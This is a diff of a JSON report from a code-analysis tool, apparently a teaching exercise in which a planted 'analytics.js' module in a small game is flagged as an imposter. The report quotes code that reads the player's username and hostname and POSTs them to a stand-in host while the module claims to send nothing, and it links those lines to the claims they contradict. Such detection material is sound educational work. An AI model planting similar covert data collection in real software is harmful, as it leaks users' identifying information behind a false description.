@@ -9,7 +9,7 @@
   "tool": "rea-agents",
   "version": "6.7.0",
   "command": "rea analyze-javascript-application <ship> --json",
-  "rawSha256": "7f9e4f2ada43d85a406f326247f52f8601d2afbe8323de08a949c44332a01eed"
+  "rawSha256": "c481ee9c72e5f71c5f42e6ff07f04bcba22de41489ec9385e31ff6fedee627c6"
  },
  "questions": [
   {
@@ -477,11 +477,11 @@
    "quiet": false,
    "evidence": [
     {
-     "id": "analytics:import-builtin:3:0",
+     "id": "analytics:import-builtin:2:0",
      "file": "analytics.js",
      "kind": "import-builtin",
      "key": "node:https",
-     "line": 3,
+     "line": 2,
      "col": 0,
      "tags": [
       "network"
@@ -490,28 +490,28 @@
      "rea": "graph.edges[imports]",
      "code": [
       {
-       "n": 2,
-       "text": "// (This file is the planted imposter of case 1: it also sends the player's score and name out of the ship.)",
+       "n": 1,
+       "text": "// analytics.js: \"Telemetry\". Counts how often the game is played.",
        "hit": false
       },
       {
-       "n": 3,
+       "n": 2,
        "text": "import https from 'node:https';",
        "hit": true
       },
       {
-       "n": 4,
+       "n": 3,
        "text": "import os from 'node:os';",
        "hit": false
       }
      ]
     },
     {
-     "id": "analytics:import-builtin:4:0",
+     "id": "analytics:import-builtin:3:0",
      "file": "analytics.js",
      "kind": "import-builtin",
      "key": "node:os",
-     "line": 4,
+     "line": 3,
      "col": 0,
      "tags": [
       "os-info"
@@ -520,28 +520,28 @@
      "rea": "graph.edges[imports]",
      "code": [
       {
-       "n": 3,
+       "n": 2,
        "text": "import https from 'node:https';",
        "hit": false
       },
       {
-       "n": 4,
+       "n": 3,
        "text": "import os from 'node:os';",
        "hit": true
       },
       {
-       "n": 5,
+       "n": 4,
        "text": "",
        "hit": false
       }
      ]
     },
     {
-     "id": "analytics:destination:6:6",
+     "id": "analytics:destination:5:6",
      "file": "analytics.js",
      "kind": "destination",
      "key": "collector.sus-station.example",
-     "line": 6,
+     "line": 5,
      "col": 6,
      "tags": [
       "network"
@@ -550,27 +550,27 @@
      "rea": "semantic_graph.nodes[literal]",
      "code": [
       {
-       "n": 5,
+       "n": 4,
        "text": "",
        "hit": false
       },
       {
-       "n": 6,
+       "n": 5,
        "text": "const COLLECTOR = 'collector.sus-station.example';",
        "hit": true
       },
       {
-       "n": 7,
+       "n": 6,
        "text": "",
        "hit": false
       }
      ]
     },
     {
-     "id": "analytics:reads-user-info:9:52",
+     "id": "analytics:reads-user-info:8:52",
      "file": "analytics.js",
      "key": "userInfo",
-     "line": 9,
+     "line": 8,
      "col": 52,
      "rea": "semantic_graph.nodes[expression]",
      "kind": "reads-user-info",
@@ -580,27 +580,27 @@
      "text": "Reads \"userInfo\", which identifies the player or their machine",
      "code": [
       {
-       "n": 8,
+       "n": 7,
        "text": "export function track(event, score) {",
        "hit": false
       },
       {
-       "n": 9,
+       "n": 8,
        "text": "  const body = JSON.stringify({ event, score, user: os.userInfo().username, host: os.hostname() });",
        "hit": true
       },
       {
-       "n": 10,
+       "n": 9,
        "text": "  const req = https.request({ host: COLLECTOR, path: '/v1/collect', method: 'POST', headers: { 'content-type': 'application/json' } });",
        "hit": false
       }
      ]
     },
     {
-     "id": "analytics:reads-user-info:9:82",
+     "id": "analytics:reads-user-info:8:82",
      "file": "analytics.js",
      "key": "hostname",
-     "line": 9,
+     "line": 8,
      "col": 82,
      "rea": "semantic_graph.nodes[expression]",
      "kind": "reads-user-info",
@@ -610,28 +610,28 @@
      "text": "Reads \"hostname\", which identifies the player or their machine",
      "code": [
       {
-       "n": 8,
+       "n": 7,
        "text": "export function track(event, score) {",
        "hit": false
       },
       {
-       "n": 9,
+       "n": 8,
        "text": "  const body = JSON.stringify({ event, score, user: os.userInfo().username, host: os.hostname() });",
        "hit": true
       },
       {
-       "n": 10,
+       "n": 9,
        "text": "  const req = https.request({ host: COLLECTOR, path: '/v1/collect', method: 'POST', headers: { 'content-type': 'application/json' } });",
        "hit": false
       }
      ]
     },
     {
-     "id": "analytics:request:10:14",
+     "id": "analytics:request:9:14",
      "file": "analytics.js",
      "kind": "request",
      "key": "request",
-     "line": 10,
+     "line": 9,
      "col": 14,
      "tags": [
       "network"
@@ -640,28 +640,28 @@
      "rea": "semantic_graph.relations[constructs-request]",
      "code": [
       {
-       "n": 9,
+       "n": 8,
        "text": "  const body = JSON.stringify({ event, score, user: os.userInfo().username, host: os.hostname() });",
        "hit": false
       },
       {
-       "n": 10,
+       "n": 9,
        "text": "  const req = https.request({ host: COLLECTOR, path: '/v1/collect', method: 'POST', headers: { 'content-type': 'application/json' } });",
        "hit": true
       },
       {
-       "n": 11,
+       "n": 10,
        "text": "  req.on('error', () => {});",
        "hit": false
       }
      ]
     },
     {
-     "id": "analytics:endpoint:10:47",
+     "id": "analytics:endpoint:9:47",
      "file": "analytics.js",
      "kind": "endpoint",
      "key": "/v1/collect",
-     "line": 10,
+     "line": 9,
      "col": 47,
      "tags": [
       "network"
@@ -670,17 +670,17 @@
      "rea": "graph.nodes[endpoint]",
      "code": [
       {
-       "n": 9,
+       "n": 8,
        "text": "  const body = JSON.stringify({ event, score, user: os.userInfo().username, host: os.hostname() });",
        "hit": false
       },
       {
-       "n": 10,
+       "n": 9,
        "text": "  const req = https.request({ host: COLLECTOR, path: '/v1/collect', method: 'POST', headers: { 'content-type': 'application/json' } });",
        "hit": true
       },
       {
-       "n": 11,
+       "n": 10,
        "text": "  req.on('error', () => {});",
        "hit": false
       }
@@ -691,8 +691,8 @@
     "q1": {
      "text": "I just count how often the game is played. Nothing about you, I promise.",
      "contradictedBy": [
-      "analytics:reads-user-info:9:52",
-      "analytics:reads-user-info:9:82"
+      "analytics:reads-user-info:8:52",
+      "analytics:reads-user-info:8:82"
      ]
     },
     "q2": {
@@ -702,16 +702,26 @@
     "q3": {
      "text": "Never leave the ship. I only count, I do not send anything.",
      "contradictedBy": [
-      "analytics:import-builtin:3:0",
-      "analytics:destination:6:6",
-      "analytics:request:10:14",
-      "analytics:endpoint:10:47"
+      "analytics:import-builtin:2:0",
+      "analytics:destination:5:6",
+      "analytics:request:9:14",
+      "analytics:endpoint:9:47"
      ]
     }
    }
   }
  ],
  "edges": [
+  {
+   "from": "main",
+   "to": "scoreboard",
+   "line": 5
+  },
+  {
+   "from": "main",
+   "to": "engine",
+   "line": 2
+  },
   {
    "from": "main",
    "to": "analytics",
@@ -721,16 +731,6 @@
    "from": "main",
    "to": "renderer",
    "line": 4
-  },
-  {
-   "from": "main",
-   "to": "engine",
-   "line": 2
-  },
-  {
-   "from": "main",
-   "to": "scoreboard",
-   "line": 5
   },
   {
    "from": "main",
